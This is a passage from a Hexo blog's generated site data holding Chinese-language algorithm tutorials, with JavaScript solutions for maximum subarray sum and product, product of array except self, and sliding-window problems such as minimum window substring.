class=\"built_in\">Math</span>.max(nums[i], min * nums[i]);</span><br><span class=\"line\">      min = <span class=\"built_in\">Math</span>.min(nums[i], tempMax * nums[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解法 3</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> temp = max;</span><br><span class=\"line\">      max = min;</span><br><span class=\"line\">      min = temp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(nums[i], max * nums[i]);</span><br><span class=\"line\">    min = <span class=\"built_in\">Math</span>.min(nums[i], min * nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-除自身以外数组的乘积\"><a href=\"#3-除自身以外数组的乘积\" class=\"headerlink\" title=\"3. 除自身以外数组的乘积\"></a>3. 除自身以外数组的乘积</h3><p>描述：给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。</p>\n<p>示例:</p>\n<blockquote>\n<p>输入: [1,2,3,4]<br>输出: [24,12,8,6]</p>\n</blockquote>\n<p><strong>解题思路</strong>：</p>\n<ol>\n<li>从左向右遍历作累乘处理，则 <code>leftProducet[i]</code> 表示前 i 个数字相乘的积</li>\n<li>从右向左遍历作累乘处理，则 <code>rightProducet[i]</code> 表示后 i 个数字相乘的积（不包括第 <code>i</code> 个数字）</li>\n<li><code>res[i] = leftProducet[i] * rightProducet[i]</code> 表示除了第 <code>i</code> 个数字外的其他数字的乘积</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> productExceptSelf = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftProducet = [<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightProducet = [];</span><br><span class=\"line\">  rightProducet[len - <span class=\"number\">1</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    leftProducet[i + <span class=\"number\">1</span>] = leftProducet[i] * nums[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = len - <span class=\"number\">2</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    rightProducet[i] = rightProducet[i + <span class=\"number\">1</span>] * nums[i + <span class=\"number\">1</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    res[i] = leftProducet[i] * rightProducet[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p> </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-动态规划-求子数组的最值问题\"><a href=\"#技巧篇-动态规划-求子数组的最值问题\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 求子数组的最值问题\"></a>技巧篇 - 动态规划 - 求子数组的最值问题</h1><h3 id=\"1-子数组和最大\"><a href=\"#1-子数组和最大\" class=\"headerlink\" title=\"1. 子数组和最大\"></a>1. 子数组和最大</h3><p>描述：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>\n<p>示例:</p>\n<blockquote>\n<p>输入: [-2,1,-3,4,-1,2,1,-5,4],<br>输出: 6<br>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p>\n</blockquote>\n<p><strong>解题思路</strong>：<br>假设 <code>max[i]</code> 为 <code>nums</code> 前 <code>i</code> 个数字中<em>包含数字 <code>num[i]</code></em> 的最大值，则 <code>max[i]</code> 必定是由 <code>Math.max(max[i-1] + nums[i], nums[i])</code> 得到，遍历数组依次可得到包含 <code>num[i]</code> 的子数组的最大值， (<code>i</code> 从 <code>0 ~ n-1</code>)，取这些最大值里面最大的一个即为结果。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxSubArray = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(nums[i], max + nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-子数组乘积最大\"><a href=\"#2-子数组乘积最大\" class=\"headerlink\" title=\"2. 子数组乘积最大\"></a>2. 子数组乘积最大</h3><p>描述：给定一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字）。</p>\n<p>示例 1:</p>\n<blockquote>\n<p>输入: [3]<br>输出: 3<br>解释: 子数组 [3] 有最大乘积 3。</p>\n</blockquote>\n<p>示例 1:</p>\n<blockquote>\n<p>输入: [2,3,-2,4]<br>输出: 6<br>解释: 子数组 [2,3] 有最大乘积 6。</p>\n</blockquote>\n<p>示例 2:</p>\n<blockquote>\n<p>输入: [-2,0,-1]<br>输出: 0<br>解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。</p>\n</blockquote>\n<p><strong>解题思路</strong>：<br>假设 <code>max[i]</code>、<code>min[i]</code> 分别为 <code>nums</code> 前 <code>i</code> 个数字中<em>包含数字 <code>i</code></em> 的最大值和最小值，则 <code>max[i]</code>、<code>min[i]</code> 必定是由以下方式得到的：</p>\n<ol>\n<li><code>nums[i] &gt;= 0</code>, 则是由 <code>Math.max(nums[i], max[i - 1] *  nums[i])</code> 得到</li>\n<li><code>nums[i] &lt; 0</code>, 则是由 <code>Math.max(nums[i], min[i - 1] *  nums[i])</code> 得到</li>\n<li>由此可得到包含数字 <code>num[i]</code> 为子数组的最大值，然后取 <em>max[0]</em> ~ <em>max[n - 1]</em> 的最大值</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 解法 1</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> tempMax = max; </span><br><span class=\"line\">    <span class=\"keyword\">let</span> tempMin = min;</span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(<span class=\"built_in\">Math</span>.max(nums[i], tempMax * nums[i]), tempMin * nums[i]);</span><br><span class=\"line\">    min = <span class=\"built_in\">Math</span>.min(<span class=\"built_in\">Math</span>.min(nums[i], tempMax * nums[i]), tempMin * nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解法 2</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      max = <span class=\"built_in\">Math</span>.max(nums[i], max * nums[i]);</span><br><span class=\"line\">      min = <span class=\"built_in\">Math</span>.min(nums[i], min * nums[i]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (nums[i] &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> tempMax = max;</span><br><span class=\"line\">      max = <span class=\"built_in\">Math</span>.max(nums[i], min * nums[i]);</span><br><span class=\"line\">      min = <span class=\"built_in\">Math</span>.min(nums[i], tempMax * nums[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解法 3</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> temp = max;</span><br><span class=\"line\">      max = min;</span><br><span class=\"line\">      min = temp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(nums[i], max * nums[i]);</span><br><span class=\"line\">    min = <span class=\"built_in\">Math</span>.min(nums[i], min * nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-除自身以外数组的乘积\"><a href=\"#3-除自身以外数组的乘积\" class=\"headerlink\" title=\"3. 除自身以外数组的乘积\"></a>3. 除自身以外数组的乘积</h3><p>描述：给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。</p>\n<p>示例:</p>\n<blockquote>\n<p>输入: [1,2,3,4]<br>输出: [24,12,8,6]</p>\n</blockquote>\n<p><strong>解题思路</strong>：</p>\n<ol>\n<li>从左向右遍历作累乘处理，则 <code>leftProducet[i]</code> 表示前 i 个数字相乘的积</li>\n<li>从右向左遍历作累乘处理，则 <code>rightProducet[i]</code> 表示后 i 个数字相乘的积（不包括第 <code>i</code> 个数字）</li>\n<li><code>res[i] = leftProducet[i] * rightProducet[i]</code> 表示除了第 <code>i</code> 个数字外的其他数字的乘积</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> productExceptSelf = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftProducet = [<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightProducet = [];</span><br><span class=\"line\">  rightProducet[len - <span class=\"number\">1</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    leftProducet[i + <span class=\"number\">1</span>] = leftProducet[i] * nums[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = len - <span class=\"number\">2</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    rightProducet[i] = rightProducet[i + <span class=\"number\">1</span>] * nums[i + <span class=\"number\">1</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    res[i] = leftProducet[i] * rightProducet[i];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p> </p>\n"},{"title":"技巧篇 - 滑动窗口","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 滑动窗口\n\n滑动窗口问题经常使用双指针，定义两个变量left、right（只能向右移动），来标示一个窗口的大小，通过移动右指针找到**问题的解**，移动左指针找到**问题的最优解**\n* [0, slow) 的区域为滑动窗口已经探索过的区域\n* [slow, fast]的区域为滑动窗口正在探索的区域\n* (fast, end of array)为待探索的区域\n\n***\n\n* 固定大小的滑动窗口: 当快指针增加的时候慢指针必须增加\n* 非固定大小的滑动窗口: 快指针增加，慢指针不一定变化\n\n\n### 长度为 K 的子数组的最大值\n**问题：**给定一组大小为 n 的整数数组， 计算长度为 k 的子数组和的最大值。\n\n**示例：**\n输入: a = [-1, 4, 7, -3, 8, 5, -2, 6],  k = 3\n输出: 12 // [7, -3, 8]\n\n**思路：**\n1. 先计算前 k 个值的总和\n2. 从第 k 个数到 n 个数，每次往数组末尾增加 1 个数的同时，减去第 1 个数（即只增加差值）\n3. 遍历的过程中，保存较大的值作为结果\n\n\n### 最小覆盖子串\n\n**问题：**给定一个字符串 S 和一个字符串 T，请在 S 中找出包含 T 所有字母的最小子串。\n\n**示例：**\n输入: S = \"ADOBECODEBANC\", T = \"ABC\"\n输出: \"BANC\"\n\n**思路：**\n1. 先扫描一遍 T，把对应的字符及其出现的次数存到 HashMap 中\n2. 然后遍历 S，把遍历到的字母对应的 HashMap 中的 value 减 1，如果减 1 后仍大于等于 0（说明是 T 中的字符），count 自增 1\n   1. 完全找到每个 T 中的每个字符时，HashMap 中 在 T 中的每个字符对应的值为 0，其余的值为负数\n   2. 此时 `count === T.length`，找到覆盖子串\n3. 左指针向右移动从覆盖子串中寻找最小覆盖子串，并将每次匹配到的覆盖子串的结果保存下来\n   1. 左指针向右移动时，HashMap 中每个字符自加1\n   2. 如果是 T 中的字符，则自加后值为 1 （-n...0 --> 1），自加后如果小于等于 0 ，说明之前的覆盖子串中有相同的字符，剔除该字符后依然是覆盖子串\n   3. 如果不是 T 中的字符，则自加后值为 0 （-n...-1 --> 0），左指针继续向右移动，寻找更短的覆盖子串\n\n```js\nfunction fn(s, t) {\n  let size = t.length;\n  let map = {}; // 存储目标串 t 中每个字符出现的次数\n  let left = 0; // 左指针\n  let count = 0; // 目标串 t 中每个字符出现一次加 1，当 `count === size` 时，出现覆盖子串（需进一步找出最小覆盖子串）\n  let minLen = Number.MAX_VALUE; // 覆盖子串的长度\n  let res = ''; // 保存最小覆盖子串结果\n\n  for (let i = 0; i < size; i++) {\n    map[t[i]] = +map[t[i]] ? map[t[i]] + 1 : 1;\n  }\n\n  for (let i = 0; i < s.length; i++) {\n    if (--map[s[i]] >= 0) count++;\n    while (count === size) {\n      if (minLen > i - left + 1) {\n        minLen = i - left + 1;\n        res = s.substr(left, minLen);\n      }\n      if (++map[s[left]] > 0) count--;\n      left++;\n    }\n  }\n\n  return res;\n}\n\nconsole.log(fn('ADCAFEGGD', 'ACE')); // CAFE \nconsole.log(fn('ADOBDCODEBANC', 'ABC')); // BANC\nconsole.log(fn('aa', 'aa')); // aa\n```","source":"_posts/算法题/技巧篇 - 滑动窗口.md","raw":"---\ntitle: 技巧篇 - 滑动窗口\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 滑动窗口\n\n滑动窗口问题经常使用双指针，定义两个变量left、right（只能向右移动），来标示一个窗口的大小，通过移动右指针找到**问题的解**，移动左指针找到**问题的最优解**\n* [0, slow) 的区域为滑动窗口已经探索过的区域\n* [slow, fast]的区域为滑动窗口正在探索的区域\n* (fast, end of array)为待探索的区域\n\n***\n\n* 固定大小的滑动窗口: 当快指针增加的时候慢指针必须增加\n* 非固定大小的滑动窗口: 快指针增加，慢指针不一定变化\n\n\n### 长度为 K 的子数组的最大值\n**问题：**给定一组大小为 n 的整数数组， 计算长度为 k 的子数组和的最大值。\n\n**示例：**\n输入: a = [-1, 4, 7, -3, 8, 5, -2, 6],  k = 3\n输出: 12 // [7, -3, 8]\n\n**思路：**\n1. 先计算前 k 个值的总和\n2. 从第 k 个数到 n 个数，每次往数组末尾增加 1 个数的同时，减去第 1 个数（即只增加差值）\n3. 遍历的过程中，保存较大的值作为结果\n\n\n### 最小覆盖子串\n\n**问题：**给定一个字符串 S 和一个字符串 T，请在 S 中找出包含 T 所有字母的最小子串。\n\n**示例：**\n输入: S = \"ADOBECODEBANC\", T = \"ABC\"\n输出: \"BANC\"\n\n**思路：**\n1. 先扫描一遍 T，把对应的字符及其出现的次数存到 HashMap 中\n2. 然后遍历 S，把遍历到的字母对应的 HashMap 中的 value 减 1，如果减 1 后仍大于等于 0（说明是 T 中的字符），count 自增 1\n   1. 完全找到每个 T 中的每个字符时，HashMap 中 在 T 中的每个字符对应的值为 0，其余的值为负数\n   2. 此时 `count === T.length`，找到覆盖子串\n3. 左指针向右移动从覆盖子串中寻找最小覆盖子串，并将每次匹配到的覆盖子串的结果保存下来\n   1. 左指针向右移动时，HashMap 中每个字符自加1\n   2. 如果是 T 中的字符，则自加后值为 1 （-n...0 --> 1），自加后如果小于等于 0 ，说明之前的覆盖子串中有相同的字符，剔除该字符后依然是覆盖子串\n   3. 如果不是 T 中的字符，则自加后值为 0 （-n...-1 --> 0），左指针继续向右移动，寻找更短的覆盖子串\n\n```js\nfunction fn(s, t) {\n  let size = t.length;\n  let map = {}; // 存储目标串 t 中每个字符出现的次数\n  let left = 0; // 左指针\n  let count = 0; // 目标串 t 中每个字符出现一次加 1，当 `count === size` 时，出现覆盖子串（需进一步找出最小覆盖子串）\n  let minLen = Number.MAX_VALUE; // 覆盖子串的长度\n  let res = ''; // 保存最小覆盖子串结果\n\n  for (let i = 0; i < size; i++) {\n    map[t[i]] = +map[t[i]] ? map[t[i]] + 1 : 1;\n  }\n\n  for (let i = 0; i < s.length; i++) {\n    if (--map[s[i]] >= 0) count++;\n    while (count === size) {\n      if (minLen > i - left + 1) {\n        minLen = i - left + 1;\n        res = s.substr(left, minLen);\n      }\n      if (++map[s[left]] > 0) count--;\n      left++;\n    }\n  }\n\n  return res;\n}\n\nconsole.log(fn('ADCAFEGGD', 'ACE')); // CAFE \nconsole.log(fn('ADOBDCODEBANC', 'ABC')); // BANC\nconsole.log(fn('aa', 'aa')); // aa\n```","slug":"算法题/技巧篇 - 滑动窗口","published":1,"updated":"2021-06-07T10:04:25.302Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yp000qok6r48qa8mkt","content":"<h1 id=\"技巧篇-滑动窗口\"><a href=\"#技巧篇-滑动窗口\" class=\"headerlink\" title=\"技巧篇 - 滑动窗口\"></a>技巧篇 - 滑动窗口</h1><p>滑动窗口问题经常使用双指针，定义两个变量left、right（只能向右移动），来标示一个窗口的大小，通过移动右指针找到<strong>问题的解</strong>，移动左指针找到<strong>问题的最优解</strong></p>\n<ul>\n<li>[0, slow) 的区域为滑动窗口已经探索过的区域</li>\n<li>[slow, fast]的区域为滑动窗口正在探索的区域</li>\n<li>(fast, end of array)为待探索的区域</li>\n</ul>\n<hr>\n<ul>\n<li>固定大小的滑动窗口: 当快指针增加的时候慢指针必须增加</li>\n<li>非固定大小的滑动窗口: 快指针增加，慢指针不一定变化</li>\n</ul>\n<h3 id=\"长度为-K-的子数组的最大值\"><a href=\"#长度为-K-的子数组的最大值\" class=\"headerlink\" title=\"长度为 K 的子数组的最大值\"></a>长度为 K 的子数组的最大值</h3><p><strong>问题：</strong>给定一组大小为 n 的整数数组， 计算长度为 k 的子数组和的最大值。</p>\n<p><strong>示例：</strong><br>输入: a = [-1, 4, 7, -3, 8, 5, -2, 6],  k = 3<br>输出: 12 // [7, -3, 8]</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>先计算前 k 个值的总和</li>\n<li>从第 k 个数到 n 个数，每次往数组末尾增加 1 个数的同时，减去第 1 个数（即只增加差值）</li>\n<li>遍历的过程中，保存较大的值作为结果</li>\n</ol>\n<h3 id=\"最小覆盖子串\"><a href=\"#最小覆盖子串\" class=\"headerlink\" title=\"最小覆盖子串\"></a>最小覆盖子串</h3><p><strong>问题：</strong>给定一个字符串 S 和一个字符串 T，请在 S 中找出包含 T 所有字母的最小子串。</p>\n<p><strong>示例：</strong><br>输入: S = “ADOBECODEBANC”, T = “ABC”<br>输出: “BANC”</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>先扫描一遍 T，把对应的字符及其出现的次数存到 HashMap 中</li>\n<li>然后遍历 S，把遍历到的字母对应的 HashMap 中的 value 减 1，如果减 1 后仍大于等于 0（说明是 T 中的字符），count 自增 1<ol>\n<li>完全找到每个 T 中的每个字符时，HashMap 中 在 T 中的每个字符对应的值为 0，其余的值为负数</li>\n<li>此时 <code>count === T.length</code>，找到覆盖子串</li>\n</ol>\n</li>\n<li>左指针向右移动从覆盖子串中寻找最小覆盖子串，并将每次匹配到的覆盖子串的结果保存下来<ol>\n<li>左指针向右移动时，HashMap 中每个字符自加1</li>\n<li>如果是 T 中的字符，则自加后值为 1 （-n…0 –&gt; 1），自加后如果小于等于 0 ，说明之前的覆盖子串中有相同的字符，剔除该字符后依然是覆盖子串</li>\n<li>如果不是 T 中的字符，则自加后值为 0 （-n…-1 –&gt; 0），左指针继续向右移动，寻找更短的覆盖子串</li>\n</ol>\n</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 